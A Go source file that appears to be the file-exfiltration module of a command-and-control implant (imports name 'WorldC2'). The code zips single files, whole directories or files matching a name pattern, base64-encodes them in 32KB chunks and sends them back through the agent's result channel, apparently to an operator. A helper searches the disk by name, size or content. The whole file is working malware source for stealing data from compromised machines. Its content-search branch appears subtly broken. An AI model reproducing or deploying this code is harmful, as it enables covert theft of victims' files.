package agent

import (
	"archive/zip"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	proto "github.com/Ruby570bocadito/WorldC2/src/go/internal/proto"
)

// FileExfil handles file exfiltration with compression and chunking.
type FileExfil struct {
	chunkSize int
	taskID    string
	agent     *Agent
}

// NewFileExfil creates a new file exfiltration handler.
func NewFileExfil(agent *Agent, taskID string) *FileExfil {
	return &FileExfil{
		chunkSize: 32 * 1024, // 32KB chunks
		taskID:    taskID,
		agent:     agent,
	}
}

// ExfilFile reads and sends a single file.
func (fe *FileExfil) ExfilFile(filePath string) error {
	info, err := os.Stat(filePath)
	if err != nil {
		return fe.sendError(err.Error())
	}

	if info.IsDir() {
		return fe.exfilDirectory(filePath)
	}

	return fe.sendFile(filePath)
}

// ExfilDirectory compresses and sends a directory.
func (fe *FileExfil) exfilDirectory(dirPath string) error {
	// Create temp zip
	tmpZip := filepath.Join(os.TempDir(), fmt.Sprintf("bty_exfil_%d.zip", os.Getpid()))

	if err := zipDirectory(dirPath, tmpZip); err != nil {
		return fe.sendError(fmt.Sprintf("zip error: %v", err))
	}
	defer os.Remove(tmpZip)

	return fe.sendFile(tmpZip)
}

// ExfilPattern searches for files matching a pattern and sends them.
func (fe *FileExfil) ExfilPattern(root, pattern string) error {
	var files []string

	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if matched, _ := filepath.Match(pattern, info.Name()); matched && !info.IsDir() {
			files = append(files, path)
		}
		return nil
	})

	if len(files) == 0 {
		return fe.sendError(fmt.Sprintf("no files matching '%s' in %s", pattern, root))
	}

	// Create temp zip
	tmpZip := filepath.Join(os.TempDir(), fmt.Sprintf("bty_exfil_%d.zip", os.Getpid()))

	zf, err := os.Create(tmpZip)
	if err != nil {
		return fe.sendError(err.Error())
	}
	defer zf.Close()
	defer os.Remove(tmpZip)

	w := zip.NewWriter(zf)

	for _, f := range files {
		if err := addFileToZip(w, f); err != nil {
			continue
		}
	}

	w.Close()
	zf.Close()

	return fe.sendFile(tmpZip)
}

func (fe *FileExfil) sendFile(filePath string) error {
	f, err := os.Open(filePath)
	if err != nil {
		return fe.sendError(err.Error())
	}
	defer f.Close()

	info, _ := f.Stat()
	totalSize := info.Size()

	fe.sendProgress(0, totalSize, fmt.Sprintf("Sending %s (%d bytes)", filepath.Base(filePath), totalSize))

	buf := make([]byte, fe.chunkSize)
	sent := int64(0)

	for {
		n, err := f.Read(buf)
		if n > 0 {
			encoded := base64.StdEncoding.EncodeToString(buf[:n])
			result := fmt.Sprintf("file_chunk:%d:%d:%s", sent, sent+int64(n), encoded)
			fe.agent.results <- &proto.TaskResult{
				TaskId:  fe.taskID,
				Output:  result,
				Success: true,
			}
			sent += int64(n)
			fe.sendProgress(sent, totalSize, "")
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			return fe.sendError(err.Error())
		}
	}

	fe.sendProgress(totalSize, totalSize, "Complete")
	return nil
}

func (fe *FileExfil) sendProgress(sent, total int64, msg string) {
	if msg == "" {
		pct := float64(sent) / float64(total) * 100
		msg = fmt.Sprintf("Progress: %.1f%% (%d/%d bytes)", pct, sent, total)
	}
	fe.agent.results <- &proto.TaskResult{
		TaskId:  fe.taskID,
		Output:  fmt.Sprintf("progress:%s", msg),
		Success: true,
	}
}

func (fe *FileExfil) sendError(msg string) error {
	fe.agent.results <- &proto.TaskResult{
		TaskId:       fe.taskID,
		ErrorMessage: msg,
		Success:      false,
	}
	return fmt.Errorf("%s", msg)
}

// zipDirectory creates a zip archive of a directory.
func zipDirectory(srcDir, destZip string) error {
	zf, err := os.Create(destZip)
	if err != nil {
		return err
	}
	defer zf.Close()

	w := zip.NewWriter(zf)
	defer w.Close()

	return filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}
		return addFileToZip(w, path)
	})
}

// addFileToZip adds a single file to a zip writer.
func addFileToZip(w *zip.Writer, filePath string) error {
	f, err := os.Open(filePath)
	if err != nil {
		return nil
	}
	defer f.Close()

	relPath, _ := filepath.Rel("/", filePath)
	fw, err := w.Create(relPath)
	if err != nil {
		return err
	}

	_, err = io.Copy(fw, f)
	return err
}

// SearchFiles searches for files matching criteria.
func SearchFiles(root, pattern string, maxSize int64, minSize int64) []string {
	var results []string

	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}

		// Size filter
		if maxSize > 0 && info.Size() > maxSize {
			return nil
		}
		if minSize > 0 && info.Size() < minSize {
			return nil
		}

		// Pattern match
		if pattern != "" {
			if matched, _ := filepath.Match(pattern, info.Name()); !matched {
				return nil
			}
		}

		// Content search (for text files)
		if strings.HasPrefix(pattern, "content:") {
			searchTerm := strings.TrimPrefix(pattern, "content:")
			if contentMatches(path, searchTerm) {
				results = append(results, path)
			}
			return nil
		}

		results = append(results, path)

		if len(results) >= 100 {
			return filepath.SkipAll
		}

		return nil
	})

	return results
}

func contentMatches(filePath, searchTerm string) bool {
	f, err := os.Open(filePath)
	if err != nil {
		return false
	}
	defer f.Close()

	buf := make([]byte, 8192)
	n, _ := f.Read(buf)
	return strings.Contains(strings.ToLower(string(buf[:n])), strings.ToLower(searchTerm))
}
